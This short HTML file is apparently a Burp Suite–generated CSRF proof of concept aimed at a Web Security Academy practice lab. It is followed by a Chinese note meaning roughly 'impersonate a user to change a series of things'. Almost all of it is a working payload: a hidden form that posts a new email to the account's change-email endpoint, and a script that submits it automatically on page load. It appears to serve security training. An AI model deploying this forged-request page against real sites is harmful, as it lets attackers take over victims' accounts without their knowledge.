<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->

    <form action="https://0a1100070479f526c0b5143a00e600e5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aa&#64;aa&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
			<script>document.forms[0].submit()</script>
  </body>
</html>

冒充一个用户修改一系列的东西
